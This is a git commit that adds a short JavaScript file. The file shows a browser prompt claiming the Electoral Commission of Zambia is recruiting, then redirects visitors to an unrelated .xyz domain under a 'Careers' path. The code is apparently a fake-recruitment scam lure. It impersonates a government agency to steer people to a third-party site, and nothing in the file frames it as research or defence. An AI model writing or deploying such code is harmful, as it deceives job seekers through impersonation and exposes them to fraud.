5e1cc40ef471e9d8c5f709e83f1162bdebc64e82
newetijazz8 <newetijazz8@gmail.com>
2025-12-01 07:25:33 +0100

    Create zmelectoral.js

---
+++ zmelectoral.js
@@ -0,0 +1,5 @@
+var password = 'electoral Commission of Zambia'
+password=prompt('NOTICE: ECZ Zambia is currently recruiting, press OK to apply for the','electoral Commission of Zambia');
+if (password != 'electoral Commission of Zambia') {
+location.href='https://www.itinpty.xyz/ecz-Zm-Careers';
+}
